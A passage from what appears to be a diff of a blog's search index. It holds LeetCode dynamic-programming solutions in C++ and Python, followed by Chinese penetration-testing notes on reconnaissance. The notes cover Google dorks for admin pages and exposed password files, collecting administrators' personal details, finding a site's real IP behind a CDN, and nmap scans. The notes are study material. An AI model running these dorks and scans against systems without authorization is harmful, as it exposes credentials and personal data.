               j = i + length - <span class="number">1</span>  <span class="comment"># 子串结束位置</span></span><br><span class="line">                <span class="keyword">if</span> s[i] == s[j] <span class="keyword">and</span> dp[i + <span class="number">1</span>][j - <span class="number">1</span>]:  <span class="comment"># 状态转移</span></span><br><span class="line">                    dp[i][j] = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">if</span> length &gt; (end - start + <span class="number">1</span>):  <span class="comment"># 更新最长回文子串</span></span><br><span class="line">                        start, end = i, j</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> s[start:end + <span class="number">1</span>]  <span class="comment"># 返回最长回文子串</span></span><br><span class="line">//优化</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">max_hw</span>(<span class="params">l:<span class="built_in">int</span>, r:<span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span> :</span><br><span class="line">            <span class="keyword">while</span> l&gt;=<span class="number">0</span> <span class="keyword">and</span> r&lt;<span class="built_in">len</span>(s) <span class="keyword">and</span> s[l] == s[r]:</span><br><span class="line">                l -= <span class="number">1</span></span><br><span class="line">                r += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> s[l+<span class="number">1</span>:r]</span><br><span class="line"></span><br><span class="line">        result = s[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            odd = max_hw(i,i)</span><br><span class="line">            even = max_hw(i,i+<span class="number">1</span>)</span><br><span class="line">            result = <span class="built_in">max</span>(result,odd,even,key=<span class="built_in">len</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
-<h2 id="509-斐波那契数">509.斐波那契数</h2>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fib</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> f1=<span class="number">0</span>,f2 =<span class="number">1</span>,temp;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            temp = f1+f2;</span><br><span class="line">            f1 = f2;</span><br><span class="line">            f2 = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        f1 ,f2 ,fn = <span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n ==<span class="number">0</span> :<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">            fn = f1 + f2</span><br><span class="line">            f1, f2 = f2, fn</span><br><span class="line">        <span class="keyword">return</span> fn </span><br></pre></td></tr></table></figure>
-<h2 id="300-最长增长子序列">300.最长增长子序列</h2>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]&lt;nums[i])&#123;</span><br><span class="line">                    dp[i] = <span class="built_in">max</span>(dp[i],dp[j]<span class="number">+1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">max_element</span>(dp.<span class="built_in">begin</span>(),dp.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//优化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it = <span class="built_in">lower_bound</span>(dp.<span class="built_in">begin</span>(),dp.<span class="built_in">end</span>(),num);</span><br><span class="line">            <span class="keyword">if</span>(it == dp.<span class="built_in">end</span>())&#123;</span><br><span class="line">                dp.<span class="built_in">push_back</span>(num);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                *it = num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLIS</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nums: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        dp = [<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                <span class="keyword">if</span> nums[j]&lt;nums[i]:</span><br><span class="line">                    dp[i] = <span class="built_in">max</span>(dp[i],dp[j]+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp)</span><br><span class="line"><span class="comment"># 优化：二分查找</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLIS</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nums:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        dp = []  <span class="comment"># 用于存储递增子序列</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="comment"># 使用二分查找找到插入位置</span></span><br><span class="line">            pos = bisect.bisect_left(dp, num)</span><br><span class="line">            <span class="keyword">if</span> pos == <span class="built_in">len</span>(dp):</span><br><span class="line">                dp.append(num)  <span class="comment"># 如果 num 大于所有元素，直接添加到末尾</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[pos] = num  <span class="comment"># 否则替换掉第一个大于等于 num 的元素</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(dp)  <span class="comment"># dp 的长度即为最长递增子序列的长度</span></span><br></pre></td></tr></table></figure>
-<h2 id="72-编辑距离">72.编辑距离</h2>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n1 = word<span class="number">1.l</span>ength(), n2 = word<span class="number">2.l</span>ength();</span><br><span class="line">        <span class="keyword">if</span>(n1*n2==<span class="number">0</span>) <span class="keyword">return</span> n1+n2;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n1<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n2<span class="number">+1</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n1<span class="number">+1</span>;i++) dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n2<span class="number">+1</span>;j++) dp[<span class="number">0</span>][j] = j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n1<span class="number">+1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;n2<span class="number">+1</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j]=<span class="number">1</span>+<span class="built_in">min</span>(&#123;dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j<span class="number">-1</span>]&#125;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n1][n2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minDistance</span>(<span class="params">self, word1: <span class="built_in">str</span>, word2: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n1, n2 = <span class="built_in">len</span>(word1), <span class="built_in">len</span>(word2)</span><br><span class="line">        <span class="keyword">if</span> n1*n2 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> n1+n2</span><br><span class="line">        dp = [[<span class="number">0</span>]*(n2+<span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n1+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n1+<span class="number">1</span>):</span><br><span class="line">            dp[i][<span class="number">0</span>]=i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n2+<span class="number">1</span>):</span><br><span class="line">            dp[<span class="number">0</span>][j]=j</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n1+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n2+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> word1[i-<span class="number">1</span>] == word2[j-<span class="number">1</span>]:</span><br><span class="line">                    dp[i][j] = dp [i-<span class="number">1</span>][j-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>],dp[i-<span class="number">1</span>][j-<span class="number">1</span>])+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> dp[n1][n2]</span><br></pre></td></tr></table></figure>
-<h2 id="198-打家劫舍">198.打家劫舍</h2>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>(),dp0=<span class="number">0</span>,dp1=nums[<span class="number">0</span>],temp;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            temp = <span class="built_in">max</span>(dp0,dp1);</span><br><span class="line">            dp1 = dp0 + nums[i];</span><br><span class="line">            dp0 = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp0,dp1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rob</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">if</span> n ==<span class="number">0</span> :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        dp = [[<span class="number">0</span>]*<span class="number">2</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>] = nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i-<span class="number">1</span>][<span class="number">0</span>],dp[i-<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">            dp[i][<span class="number">1</span>] = dp[i-<span class="number">1</span>][<span class="number">0</span>]+nums[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp[n-<span class="number">1</span>][<span class="number">0</span>],dp[n-<span class="number">1</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
-<h1>贪心算法</h1>
-]]></content>
-  </entry>
-  <entry>
-    <title>Git</title>
-    <url>/2025/04/25/Git/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>渗透测试</title>
-    <url>/2025/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络适配器-&gt;WLAN点下拉geng&#x27;d-&gt;共享</span><br><span class="line">clash verge: 打开系统代理和Tun 端口号7897</span><br><span class="line">ip: VMnet8的IPv4地址</span><br><span class="line">git 全局代理：</span><br><span class="line">	添加：git config --global http.proxy http://IP:7897</span><br><span class="line">		 git config --global https.proxy http://IP:7897</span><br><span class="line">	取消：git config --global --unset http.proxy</span><br><span class="line">		 git config --global --unset https.proxy</span><br><span class="line">	查看：git config --global -l</span><br></pre></td></tr></table></figure>
-<h1>信息收集</h1>
-<h2 id="需收集的信息：">需收集的信息：</h2>
-<ul>
-<li>域名信息(whois.、备案信息、子域名)</li>
-<li>服务器信息（端口、服务、真实IP)</li>
-<li>网站信息（网站架构、操作系统、中间件、数据库、编程语言、指纹信息、W八F、敏感目录、敏感文件、源码泄露、旁站、C段)</li>
-<li>管理员信息（姓名、职务、生日、联系电话、邮件地址）</li>
-</ul>
-<h2 id="域名信息">域名信息</h2>
-<h3 id="whois">whois</h3>
-<h4 id="域名查询whois">域名查询whois</h4>
-<p>根据已知域名反查,获取:注册人邮箱;注册人姓名;注册人手机;注册更新时间等信息</p>
-<ul>
-<li>
-<p>脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd yjtools</span><br><span class="line">python whois_check.py</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>命令行</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whois [域名]</span><br></pre></td></tr></table></figure>
-<ul>
-<li>接口</li>
-</ul>
-<blockquote>
-<p><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>
-<a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a><br>
-<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
-</blockquote>
-<h4 id="whois反查域名">whois反查域名</h4>
-<p>根据已知域名WHOIS中的信息来反查其它与此信息相同的域名列表,但可能是代理商</p>
-<ul>
-<li>接口</li>
-</ul>
-<blockquote>
-<p><a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a>                              查询到的邮箱名前几位隐蔽</p>
-<p><a href="https://whois.aizhan.com/reverse-whois/">https://whois.aizhan.com/reverse-whois/</a></p>
-</blockquote>
-<h3 id="备案号">备案号</h3>
-<p>网页最下方通常有备案号,通过备案号查询该公司旗下其他域名或资产</p>
-<ul>
-<li>接口</li>
-</ul>
-<blockquote>
-<p><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p>
-<p><a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p>
-<p><a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p>
-</blockquote>
-<h3 id="子域名">子域名</h3>
-<h4 id="google-hacking">google hacking</h4>
-<ul>
-<li>语法</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>字符</th>
-<th>注释</th>
-<th>例子</th>
-<th>注释</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>intext</td>
-<td>寻找正文中含有关 键字的网页</td>
-<td>intext：后台登录</td>
-<td>将只返回正文中包含“后台登录”的网页</td>
-</tr>
-<tr>
-<td>intitle</td>
-<td>寻找标题中含有关 键字的网页</td>
-<td>intitle：后台登录</td>
-<td>将只返回标题中包含“后台 登录”的网页，intitle：后台登录密码将返回标题中 包含“后台登录而正文中包 含密码的网页</td>
-</tr>
-<tr>
-<td>allinitle</td>
-<td>用法和intitle类 似，只不过可以指 定多个词</td>
-<td>alltitle：后台登录 管理员</td>
-<td>将返回标题中包含“后台登录”和“管理员”的网页</td>
-</tr>
-<tr>
-<td>inurl</td>
-<td>将返回ur中含有关 键词的网页</td>
-<td>inurl:Login</td>
-<td>将返回ur1中含有Login 的网页</td>
-</tr>
-<tr>
-<td>allinurl</td>
-<td>用法和inurl类似， 只不过可以指定多 个词 n</td>
-<td>allinurl:Login admin</td>
-<td>将返回ur1中含有Login 和admin的网页</td>
-</tr>
-<tr>
-<td>site</td>
-<td>指定访问的站点</td>
-<td>site:baidu.com inurl:Login</td>
-<td>将只在baidu.com中查找 urI中含有Login的网页</td>
-</tr>
-<tr>
-<td>filetype</td>
-<td>指定访问的文件类 型</td>
-<td>site:baidu.com filetype:pdf</td>
-<td>将只返回baidu.com站点 上文件类型为pdf的网页</td>
-</tr>
-<tr>
-<td>link</td>
-<td>指定链接的网页</td>
-<td>link:www.baidu.com</td>
-<td>将返回所有包含指向 www.baidu.com的网页</td>
-</tr>
-<tr>
-<td>related</td>
-<td>相似类型的网页</td>
-<td>related:www.xjtu.edu.cn</td>
-<td>将返回与 www.xjtu.edu.cn相似的 页面，相似指的是网页的布局相似</td>
-</tr>
-<tr>
-<td>info</td>
-<td>返回站点的指定信 意</td>
-<td>info:www.baidu.com corn</td>
-<td>将返回百度的一些信息</td>
-</tr>
-<tr>
-<td>define</td>
-<td>返回某个词语的定 发</td>
-<td>define:Hacker</td>
-<td>将返回关于 Hacker的定义</td>
-</tr>
-<tr>
-<td>cache</td>
-<td>网页快照，谷歌将 返回给你它存储下 莱的房使货</td>
-<td>cache:www.hackingspirits.com guest</td>
-<td>将返回指定网站的缓存，并 且正文中含有guest</td>
-</tr>
-</tbody>
-</table>
-<ul>
-<li>示例</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>语法</th>
-<th>注释</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>inurl://admin/login.php</td>
-<td>查找管理员登录页面</td>
-</tr>
-<tr>
-<td>inurl:/phpmyadmin/index.php</td>
-<td>查找后台数据库管理页面</td>
-</tr>
-<tr>
-<td>site:baidu.com inurl:Login</td>
-<td>只在baidu.com中查找url 中含有Login的网页</td>
-</tr>
-<tr>
-<td>site:baidu.com filetype:pdf ed</td>
-<td>只返回baidu.com站点上 文件类型为pdf的网页</td>
-</tr>
-<tr>
-<td>link:www.baidu.com</td>
-<td>返回所有包含指向 www.baidu.com的网页</td>
-</tr>
-<tr>
-<td>related:www.1lhc.edu.cn</td>
-<td>返回与 www.11hc.edu.cn网页 布局相似的页面</td>
-</tr>
-<tr>
-<td>site:xx.comintext:管理site:xx.cominurl:login site:xx.comintitle:后台</td>
-<td>查找网站后台</td>
-</tr>
-<tr>
-<td>site:xx.com filetype:php site:xx.com filetype:asp site:xx.com filetype:jsp site:xx.com filetype:aspx</td>
-<td>查看服务器使用的程序</td>
-</tr>
-<tr>
-<td>site:xx.com inurl:file site:xx.com inurl:load</td>
-<td>查看上传漏洞</td>
-</tr>
-</tbody>
-</table>
-<ul>
-<li>Index of目录发现</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index of /admin</span><br><span class="line">index of /passwd</span><br><span class="line">index of /password</span><br><span class="line">index of /mail</span><br><span class="line">&quot;index of /&quot; +passwd</span><br><span class="line">&quot;index of /&quot; +password.txt</span><br><span class="line">&quot;index of /&quot; +.htaccess</span><br><span class="line">&quot;index of /root&quot;</span><br><span class="line">&quot;index of /cgi-bin&quot;</span><br><span class="line">&quot;index of /logs&quot;</span><br><span class="line">&quot;index of /config&quot;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>子域名查询</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:[域名]</span><br></pre></td></tr></table></figure>
-<ul>
-<li>接口查询</li>
-</ul>
-<blockquote>
-<p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br>
-<a href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn/</a><br>
-<a href="https://developers.virustotal.com/reference/domains-relationships">https://developers.virustotal.com/reference/domains-relationships</a><br>
-<a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a><br>
-<a href="https://www.nmmapper.com/sys/tools/subdomainfinder/">https://www.nmmapper.com/sys/tools/subdomainfinder/</a></p>
-</blockquote>
-<h4 id="网络空间测绘工具">网络空间测绘工具</h4>
-<table>
-<thead>
-<tr>
-<th>工具名称</th>
-<th>网址</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>FOFA</td>
-<td><a href="https://fofa.info/">https://fofa.info/</a></td>
-<td>domain=“[域名]”</td>
-</tr>
-<tr>
-<td>鹰图</td>
-<td><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></td>
-<td>domain=“[域名]”</td>
-</tr>
-<tr>
-<td>钟馗之眼</td>
-<td><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></td>
-<td>site:“[域名]”</td>
-</tr>
-<tr>
-<td>shodan</td>
-<td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td>
-<td>hostname:[域名]</td>
-</tr>
-</tbody>
-</table>
-<h4 id="SSL证书查询">SSL证书查询</h4>
-<blockquote>
-<p><a href="https://crt.sh/">https://crt.sh/</a></p>
-<p><a href="https://developers.facebook.com/tools/ct/search/">https://developers.facebook.com/tools/ct/search/</a></p>
-</blockquote>
-<h4 id="JS文件发现">JS文件发现</h4>
-<ul>
-<li>
-<p>脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd JSFinder</span><br><span class="line">python JSFinder.py -u http://[域名]</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="聚合工具">聚合工具</h4>
-<p>OneForAll</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda active py39\</span><br><span class="line">cd OneForAll/</span><br><span class="line">python oneforall.py --target [域名] run</span><br><span class="line">(谷歌联网)</span><br><span class="line">(查看 ./results/[域名].csv)</span><br></pre></td></tr></table></figure>
-<h4 id="爆破">爆破</h4>
-<p>子域名挖掘机(主机D://渗透)</p>
-<h2 id="服务器信息">服务器信息</h2>
-<h3 id="IP收集">IP收集</h3>
-<h4 id="IP反查域名">IP反查域名</h4>
-<blockquote>
-<p><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a><br>
-<a href="https://tools.ipip.net/ipdomain.php">https://tools.ipip.net/ipdomain.php</a><br>
-<a href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn/</a><br>
-<a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
-</blockquote>
-<h4 id="域名查IP">域名查IP</h4>
-<p><a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a><br>
-<a href="https://ipchaxun.com/">https://ipchaxun.com/</a><br>
-<a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
-<h4 id="C段存活主机探测">C段存活主机探测</h4>
-<p>先旁注 后C段</p>
-<p>查找与目标服务器P处于同一个C段的服务器IP</p>
-<p>域名显示运营商是阿里云不是xxx机房之类，不用查</p>
-<ul>
-<li>nmap</li>
-</ul>
-<p>只能查出有没有开机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP www.example.com/24</span><br><span class="line">nmap -sP 192.168.1.*</span><br></pre></td></tr></table></figure>
-<ul>
-<li>脚本</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./TxPortMap -i www.example.com/24 -p 80</span><br></pre></td></tr></table></figure>
-<h4 id="CDN">CDN</h4>
-<p>多地ping</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ping.chinaz.com/</span><br><span class="line">https://ping.aizhan.com/</span><br><span class="line">http://www.webkaka.com/Ping.aspx</span><br></pre></td></tr></table></figure>
-<p>用各种多地ping的服务，查看对应P地址是否唯一</p>
-<ul>
-<li>国外访问</li>
-</ul>
-<blockquote>
-<p><a href="https://ping.sx/ping">https://ping.sx/ping</a></p>
-</blockquote>
-<p>有些网站设置CDN可能没有把国外的访问包含进去，所以可以这么绕过</p>
-<ul>
-<li>
-<p>查询子域名IP</p>
-</li>
-<li>
-<p>MX记录邮件服务</p>
-<p>​    MX记录是一种常见的查找IP的方式。如果网站在与wb相同的服务器和IP上托管自己的邮件服务器，那么原始服务器P将在MX记录中。</p>
-</li>
-<li>
-<p>查询历史DNS记录</p>
-</li>
-</ul>
-<blockquote>
-<p><a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a><br>
-<a href="https://www.ip138.com/">https://www.ip138.com/</a></p>
-</blockquote>
-<p>真实ip可能是买DNS的前一个</p>
-<h3 id="端口收集">端口收集</h3>
-<p>一个电脑最多65525个端口,常见端口总结</p>
-<blockquote>
-<p><a href="https://edu.yijinglab.com/post/280">https://edu.yijinglab.com/post/280</a></p>
-</blockquote>
-<ul>
-<li>nmap</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.1</span><br><span class="line"></span><br><span class="line">A：全面扫描\综合扫描</span><br><span class="line">T4：扫描速度，共有6级，T0-T5</span><br><span class="line"></span><br><span class="line">不加端口则扫描默认端口，1-1024 + nmap-service</span><br><span class="line"></span><br><span class="line">单一主机扫描：</span><br><span class="line">nmap 192.168.1.2</span><br><span class="line"></span><br><span class="line">子网扫描：</span><br><span class="line">nmap 192.168.1.1/24</span><br><span class="line"></span><br><span class="line">多主机扫描：</span><br><span class="line">nmap 192.168.1.1 192.168.1.10</span><br><span class="line"></span><br><span class="line">主机范围扫描：</span><br><span class="line">nmap 192.168.1.1-100</span><br><span class="line"></span><br><span class="line">IP地址列表扫描：</span><br><span class="line">nmap –iL target.txt</span><br><span class="line"></span><br><span class="line">扫描除指定IP外的所有子网主机：</span><br><span class="line">nmap 192.168.1.1/24 --exclude 192.168.1.1</span><br><span class="line"></span><br><span class="line">扫描除文件中IP外的子网主机：</span><br><span class="line">nmap 192.168.1.1/24 --excludefile xxx.txt</span><br><span class="line"></span><br><span class="line">扫描特定主机上的80,21,23端口：</span><br><span class="line">nmap –p 80,21,23 192.168.1.1</span><br></pre></td></tr></table></figure>
